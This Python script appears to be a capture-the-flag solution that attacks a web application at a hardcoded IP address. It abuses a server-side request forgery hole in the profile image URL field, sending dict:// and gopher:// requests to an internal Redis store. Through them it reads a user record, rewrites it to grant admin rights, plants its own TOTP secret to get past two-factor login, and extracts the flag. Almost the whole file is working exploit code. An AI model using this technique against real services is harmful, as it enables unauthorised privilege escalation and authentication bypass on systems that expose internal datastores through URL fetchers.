import requests
import json
import urllib
import pyotp

#cookies = {
#    "session": "eyJ1c2VyIjoiZmRhZGZkZmcifQ.ZIRrMA.lVATfx4bTV2TTwRNG-koEboZDAM"
#}
session = requests.Session()
server = "http://161.35.16.37:5006"

def run(url, timeout=5):
    res = session.post(server + "/profile", data={"url": url}, allow_redirects=False, timeout=timeout)
    if res.status_code == 302:
        return True
    else:
        print(f"Status {res.status_code}:", get_alert(res.text))
        return None # Might still be success

def run_gopher(host, command):
    run(f"gopher://{host}:6379/_" + urllib.parse.quote(command) + "#https://")

def read_latest():
    return session.get(server + "/profile/image").text

def get_alert(content, fallback = False):
    key = '<div class="alert'
    if key not in content and fallback:
        return content
    return content.split(key)[1].split(">")[1].split("<")[0]

def create_user(username, enforce=True):
    res = session.post(server + "/register", data={
        "username": username,
        "password": username,
        "password2": username
    })
    
    if res.status_code == 200 and "Account created" in res.text:
        print(f"[+] Created user '{username}'")
        return True
    elif "Username is already taken" in res.text:
        print(f"[+] User '{username}' already exists")
        return True
    else:
        print(f"[-] Failed creating user! Got response: " + get_alert(res.text, fallback=True))
    
    if enforce:
        exit()
    
    return False

def get_session(username):
    session.cookies.clear()
    create_user(username, enforce=False)
    
    res = session.post(server + "/login", data = {
        "username": username,
        "password": username,
    }, allow_redirects=False)
    assert res.status_code == 302, f"Failed to login! Got error: {get_alert(res.text)}"
    print(f"[+] Authenticated as '{username}'")

def get_user_from_redis(username):
    res = run(f"dict://{host}:6379/GET user_{username}#Ahttp://")
    assert res == True, f"Failed to query redis for user '{username}'!"

    user = read_latest()
    assert username in user, f"Failed to obtain user from redis. Got response:\n{user}"
    return json.loads("{" + user.split("{")[1].split("\n")[0])
        
def make_admin(user: dict):
    user["is_admin"] = True
    user["hacked"] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    encoded = json.dumps(user)
    try:
        run_gopher(host, f"SET user_{user['username']} '{encoded}'")
    except Exception as err:
        print("[MAKE ADMIN] Got error: ", err)

    #run(f"dict://{host}:6379/JSON.SET user_admin $.is_admin 1#Ahttp://")

def fill_otp(otp):
    print(f"[+] Sending otp {otp}")
    res = session.post(server + "/login/2fa", data={"code": otp})
    if "CTF" in res.text:
        print("Flag: ", "CTF" + res.text.split("CTF")[1].split("}")[0] + "}")
        exit()
    else:
        print("[-] OTP response: ", get_alert(res.text))
        return False



username     = "19i1viagggg"
cmd_username = "12039ibgass"
host = "161.35.16.37"
host = "redis"

# Create user
create_user(username)
get_session(cmd_username)

# PING
run(f"dict://{host}:6379/ping#Ahttp://")
res = read_latest()
assert "+PONG" in res, f"Could not read data from redis. Expected '+PONG' but got response: \n{res}"

# Get user info
user = get_user_from_redis(username)
print(f"[+] Fetched user from redis. Admin status: {user['is_admin']}")

if not user['is_admin']:
    # Make admin
    make_admin(user)

    # Ensure we have admin
    user = get_user_from_redis(username)
    print(f"[+] Fetched user from redis. Admin status: {user['is_admin']}")

# Now create the totp token
secret = pyotp.random_base32()
run(f"dict://{host}:6379/set totp_{username} {secret}#Ahttp://")
print(f"[+] TOTP inserted with secret '{secret}'")

# Login as victim
get_session(username)
totp = pyotp.TOTP(secret, digits=8)
fill_otp(totp.now())
